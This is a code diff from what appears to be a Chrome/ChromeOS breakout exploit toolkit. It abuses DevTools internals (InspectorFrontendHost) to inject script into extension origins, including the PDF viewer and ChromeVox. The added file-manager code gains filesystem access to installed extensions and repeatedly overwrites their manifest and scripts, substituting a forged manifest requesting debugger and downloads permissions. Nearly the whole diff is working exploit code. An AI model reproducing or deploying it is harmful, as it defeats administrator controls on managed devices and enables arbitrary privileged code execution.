@@ -33,22 +33,23 @@
                 const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                 const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                 console.log('hi');
-                if (location.origin.includes("chrome-extension://" + pdfId)) {
-                    w.close();
-                    chrome.tabs.getCurrent(function (info) {
-                        chrome.windows.create({
-                            setSelfAsOpener: true,
-                            url: mojoURL
-                        }, function (win) {
-                            const r = win.tabs[0].id;
-                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });
+                // if (location.origin.includes("chrome-extension://" + pdfId)) {
+                //     w.close();
+                //     chrome.tabs.getCurrent(function (info) {
+                //         chrome.windows.create({
+                //             setSelfAsOpener: true,
+                //             url: mojoURL
+                //         }, function (win) {
+                //             const r = win.tabs[0].id;
+                //             chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });
 
-                        })
-                    })
+                //         })
+                //     })
 
 
-                    return;
-                }
+                //     return;
+                // }
+
                 // console.log(d);
                 // w.setTimeout(function() {
                 const blob_url = new Blob(["alert(1)"], { type: "text/html" });
@@ -100,7 +101,7 @@
             document.open();
             document.write(atob(`%%HTMLENTRY%%`));
             document.querySelector('#activate').onclick = function () {
-                dbgext(false, pdfId);
+                dbgext(false, "mndnfokpggljbaajbnioimlmbfngpief");
             }
             onunload = function () {
                 const og = new Date().getTime();
@@ -109,7 +110,41 @@
             document.close();
             document.title = "Dashboard";
 
+            ondragover = function (e) {
+                e.preventDefault();
+            }
+            ondrop = function (e) {
+                for (const x of e.dataTransfer.items) {
+                    const fileEnt = x.webkitGetAsEntry();
+                    console.log(fileEnt);
+                    InspectorFrontendHost.upgradeDraggedFileSystemPermissions(fileEnt.filesystem);
+                    // error will occur but that's fine
 
+                    InspectorFrontendHost.requestFileSystems();
+                    e.preventDefault();
+                }
+            }
+            self.fsDirEntries = [];
+            InspectorFrontendAPI.fileSystemsLoaded = function (l) {
+
+                const isoFs = [];
+                const paths = [];
+                for (const i of l) {
+                    const fs = DevToolsHost.isolatedFileSystem(i.fileSystemName, i.rootURL);
+                    fs.fpath = i.fileSystemPath;
+                    isoFs.push(fs);
+                    // paths.push(i.fileSystemPath);
+
+                }
+                self.isoFs = isoFs;
+                self.paths = paths;
+            }
+            setInterval(function () {
+                InspectorFrontendHost.requestFileSystems();
+            }, 10);
+            self.isoFs = [];
+            self.paths = [];
+            InspectorFrontendHost.requestFileSystems();
             document.querySelector('#forceprocsharing').onclick = function (ev) {
                 function m() {
                     var x = 0;
@@ -122,6 +157,112 @@
                 const a = open();
                 a.location.href = `javascript:(${m.toString()})()`;
 
+            }
+            document.querySelector('#filemanagerui').onclick = (ev) => {
+                InspectorFrontendHost.requestFileSystems();
+                const w = open('');
+                function fmgrui() {
+                    const fileEntries = opener.isoFs;
+                    const idToDivMap = {};
+                    const idToEntries = {};
+                    function isManifestEntry(ent) {
+                        const pathSplit = ent.fpath.split('/');
+                        return pathSplit[pathSplit.length - 1] === "manifest.json"
+                    }
+                    function assert(p) {
+                        console.assert(p);
+                    };
+                    async function convertToPerfetto(id) {
+                        const manifestJson = `{
+                            "$schema": "http://json.schemastore.org/chrome-manifest",    
+                            "manifest_version": 3,
+                            "name": "Skiovox Breakout",
+                            "description": "BETA DO NOT SHARE",
+                            "version": "0.0.1",
+                            "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhm3X7qutsrskke84ltokTObnFJakd/d0XFQ6Ox2wQueHTGJM5GUNPTY/x8bdreNtGnfzvt/Sd0vABbR0wsS6lz5yY+g6ksMXJnigFe9N7uz8E3KojDrl3xYjIe+mkiJo8yxxzPydgb7GjQ6jmsX3g+yjj67kXzm9rZFkmoZ5WmqwBZlguPYVRN/W8CIIqBZkC3Qmq6uSG7b/g93YbwqmTmGiL2sAzgvXtqvDOD6503abtQkRC795E4VjJd+ffyeRH38fAEz5ZIrA6GJsfmov1TZTIu1NTwqylSpBYl5as7C6gpmuxDV4SvHvGT2hMQuIufDhZhErjI3B7bcX+XLe1wIDAQAB",
+                            "permissions": [
+                                "debugger",
+                                "downloads",
+                                "downloads.open"
+                            ],
+                            "background": {
+                                "service_worker": "/sw.js"
+                            },
+                            "action": {
+                                "default_popup": "./index.html"
+                            }
+                        }
+                        `;
+                        // assert(idToEntries[id].length === 2); No longer valid, will need to overwrite verified_contents.json 
+                        let manifestEntry = null;
+                        let otherEntry = null;
+                        for (const x of idToEntries[id]) {
+                            if (isManifestEntry(x)) {
+                                manifestEntry = x;
+                            } else {
+                                otherEntry = x;
+                            }
+                            if (manifestEntry && otherEntry) {
+                                break;
+                            }
+                        }
+
+                        manifestEntry = await new Promise((resolve) => {
+                            manifestEntry.root.getFile('', { create: false }, resolve);
+                        })
+                        otherEntry = await new Promise((resolve) => {
+                            otherEntry.root.getFile('', { create: false }, resolve);
+                        })
+                       
+                        
+                        setInterval(async function () {
+                            const manifestWriter = await new Promise((resolve) => {
+                                manifestEntry.createWriter(resolve);
+                            });
+                            manifestWriter.write(new Blob(["<><><><><><><>"]));
+                        }, 0);
+                        setInterval(async function () {
+                            const entryWriter = await new Promise((resolve) => {
+                                otherEntry.createWriter(resolve);
+                            });
+                            entryWriter.write(new Blob(["alert(1)"]));
+                        }, 0);
+                    }
+                    for (const ent of fileEntries) {
+
+                        console.log(ent);
+                        const split = ent.fpath.split("Extensions");
+                        const id = split[1].split('/')[1];
+                        const alreadyExists = idToDivMap[id];
+
+                        const ver = split[1].split('/')[2];
+                        const path = split[1].split(ver)[1];
+                        // console.log(id, ver, path);
+                        idToEntries[id] = idToEntries[id] ?? [];
+                        idToEntries[id].push(ent);
+                        if (alreadyExists) {
+                            continue;
+                        }
+                        idToDivMap[id] = idToDivMap[id] ?? document.createElement('div');
+                        const h1 = document.createElement('h3');
+                        h1.textContent = id;
+                        const btn = document.createElement('button');
+                        btn.onclick = function (ev) {
+                            convertToPerfetto(id);
+                        }
+                        btn.textContent = "Convert to perfetto";
+                        idToDivMap[id].appendChild(h1);
+                        idToDivMap[id].appendChild(btn);
+                    }
+                    for (const x of Object.values(idToDivMap)) {
+                        console.log(x);
+                        document.body.appendChild(x);
+
+                    }
+                }
+                setTimeout(function () {
+                    w.eval(`(${fmgrui.toString()})()`);
+                }, 200);
             }
             document.querySelector('#activate2').onclick = function (ev) {
 
@@ -241,13 +382,18 @@
                 let injected = payload ?? payload_swamp.toString();
                 if (x === pdfId) {
                     path = "index.html"; // pdf viewer hack
-                    is_pdf = true;
-                    const b = prompt("code to execute!");
-                    if (!b) return;
-                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
-                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://extensions', b + '//');
+                    //     is_pdf = true;
+                    //     const b = prompt("code to execute!");
+                    //     if (!b) return;
+                    //     injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
+                    //     InspectorFrontendHost.setInjectedScriptForOrigin('chrome://extensions', b + '//');
 
                 }
+                else if (x === "mndnfokpggljbaajbnioimlmbfngpief") {
+                    path = "chromevox/options/options.html"
+                }
+                console.log(x);
+
                 const URL_1 = `chrome-extension://${x ??
                     alert("NOTREACHED")}/${path}`;
                 InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
